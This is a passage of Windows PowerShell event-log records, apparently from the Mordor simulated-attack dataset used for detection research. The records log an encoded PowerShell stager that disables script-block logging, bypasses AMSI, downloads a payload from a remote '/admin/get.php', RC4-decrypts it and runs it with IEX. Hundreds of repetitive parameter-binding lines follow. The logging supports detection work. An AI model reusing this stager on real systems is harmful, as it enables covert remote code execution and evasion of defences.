AWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=        $IV=[BitConverter]::GetBytes($(Get-Random));\n \r\n\r\nDetails: \r\nCommandInvocation(Get-Random): \"Get-Random\"\r\n","@timestamp":"2020-09-21T23:18:57.416Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":183696,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:18:57","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:18:57","Message":"Pipeline execution details for command line:             0..255 | ForEach-Object {\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=2\r\n\r\n\tSequenceNumber=13869\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            0..255 | ForEach-Object {\n \r\n\r\nDetails: \r\nCommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"\n                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;\n                $S[$_], $S[$J] = $S[$J], $S[$_];\n            \"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"0\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"1\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"2\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"3\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"4\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"5\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"6\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"7\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"8\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"9\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"10\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"11\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"12\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"13\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"14\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"15\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"16\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"17\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"18\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"19\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"20\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"21\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"22\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"23\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"24\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"25\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"26\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"27\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"28\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"29\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"30\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"31\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"32\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"33\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"34\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"35\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"36\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"37\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"38\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"39\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"40\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"41\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"42\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"43\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"44\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"45\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"46\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"47\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"48\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"49\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"50\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"51\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"52\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"53\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"54\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"55\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"56\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"57\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"58\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"59\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"60\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"61\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"62\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"63\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"64\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"65\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"66\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"67\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"68\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"69\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"70\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"71\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"72\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"73\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"74\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"75\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"76\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"77\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"78\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"79\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"80\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"81\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"82\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"83\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"84\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"85\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"86\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"87\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"88\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"89\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"90\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"91\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"92\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"93\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"94\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"95\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"96\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"97\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"98\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"99\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"100\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"101\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"102\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"103\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"104\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"105\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"106\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"107\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"108\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"109\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"110\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"111\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"112\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"113\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"114\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"115\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"116\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"117\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"118\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"119\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"120\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"121\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"122\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"123\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"124\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"125\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"126\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"127\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"128\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"129\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"130\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"131\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"132\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"133\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"134\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"135\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"136\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"137\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"138\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"139\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"140\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"141\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"142\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"143\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"144\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"145\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"146\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"147\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"148\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"149\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"150\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"151\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"152\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"153\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"154\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"155\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"156\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"157\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"158\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"159\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"160\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"161\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"162\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"163\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"164\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"165\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"166\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"167\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"168\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"169\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"170\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"171\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"172\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"173\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"174\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"175\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"176\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"177\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"178\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"179\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"180\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"181\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"182\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"183\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"184\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"185\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"186\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"187\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"188\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"189\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"190\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"191\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"192\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"193\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"194\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"195\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"196\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"197\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"198\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"199\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"200\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"201\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"202\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"203\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"204\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"205\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"206\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"207\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"208\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"209\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"210\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"211\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"212\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"213\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"214\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"215\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"216\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"217\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"218\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"219\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"220\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"221\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"222\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"223\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"224\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"225\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"226\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"227\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"228\"\r\nParameterBinding(ForEach-Object): 